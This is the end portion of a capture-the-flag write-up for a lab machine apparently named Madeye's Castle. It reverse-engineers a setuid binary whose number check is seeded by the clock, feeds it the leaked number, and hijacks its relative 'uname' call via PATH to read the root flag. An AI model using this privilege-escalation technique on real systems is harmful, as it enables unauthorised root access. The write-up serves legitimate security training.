-rwsr-xr-x 1 root root        22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root       149080 Sep 23  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root       113528 Oct  8  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
~~~

Running it will prompt for a number and will tell you if the number you guessed was the one generated randomly.

~~~
hermonine@hogwartz-castle:/srv/time-turner$ ./swagger 
Guess my number: 12  
Nope, that is not what I was thinking
I was thinking of 1438938724
hermonine@hogwartz-castle:/srv/time-turner$ ./swagger 
Guess my number: 123456
Nope, that is not what I was thinking
I was thinking of 1160506623
~~~

## Reverse Engineering

I downloaded the binary and analyzed it locally. Below is the pseudo C code of `main()`:

```c
int main(int arg0, int arg1) {
    srand(time(0x0));
    var_C = rand();
    printf("Guess my number: ");
    __isoc99_scanf(0xb8d);
    if (var_C == var_10) {
            impressive();
    }
    else {
            puts("Nope, that is not what I was thinking");
            printf("I was thinking of %d\n", var_C);
    }
    rdx = *0x28 ^ *0x28;
    if (rdx != 0x0) {
            rax = __stack_chk_fail();
    }
    else {
            rax = 0x0;
    }
    return rax;
}
```

It calls the `impressive()` function when the guessed numer is correct:

```c
int impressive() {
    setregid(0x0, 0x0);
    setreuid(0x0, 0x0);
    puts("Nice use of the time-turner!");
    printf("This system architecture is ");
    fflush(*__TMC_END__);
    rax = system("uname -p");
    return rax;
}
```

Ultimately, we have to jump to the `impressive()` function which will execute `uname -p` as `root` (because of `setregid` and `setreuid`):

## Proof of concept

Now, we can extract the expected number by running the program, and pipe the result to the program as input:

~~~
┌──(kali㉿kali)-[/data/Madeye_s_Castle/files]
└─$ echo 1234 | ./swagger | tr -dc '0-9' | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is unknown
~~~

## Hijacking uname

That's nice because we know how to jump to the `impressive()` function. Now, we need to hijack the call to `uname`. We can do it easily as `uname` is called with a relative path.

~~~
hermonine@hogwartz-castle:/tmp$ cat > uname << EOF 
#!/bin/bash
cat /root/root.txt
EOF
hermonine@hogwartz-castle:/tmp$ chmod +x uname 
hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
hermonine@hogwartz-castle:/tmp$ echo 1234 | /srv/time-turner/swagger | tr -dc '0-9' | /srv/time-turner/swagger 
Guess my number: Nice use of the time-turner!
This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
~~~

Root flag: `RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}`
